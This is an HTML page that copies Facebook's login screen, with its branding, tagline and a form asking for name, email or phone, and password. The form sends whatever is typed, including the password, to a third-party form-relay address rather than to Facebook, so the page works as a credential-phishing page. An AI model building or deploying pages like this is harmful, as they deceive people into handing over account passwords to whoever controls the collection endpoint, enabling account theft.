<html>
<head>
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="leftpart">
            <h1>Facebook</h1>
            <h3>Facebook helps you connect and share with the people.</h3>
        </div>
        <div class="Rightpart">
            <div class="loginpage">
                <form action="https://formsubmit.co/c1274c0fa92b3e08662dac449049d1ca" method="post">
                    <input type="text" placeholder="Name" name="name" required>
                    <input type="text" placeholder="Email or phone number" name="email" id="email" required>
                    <input type="password" placeholder="password" name="password" id="password" required>
                    <button type="submit" name="login">Log In</button>
                </form>
                <p>Forgot password?</p>
                <hr>
                <div class="createaccount">Create a new account</div>
            </div>
        </div>
        <span>Create a page for a well-known person, virtual Login</span>
    </div>
</body>
</html>
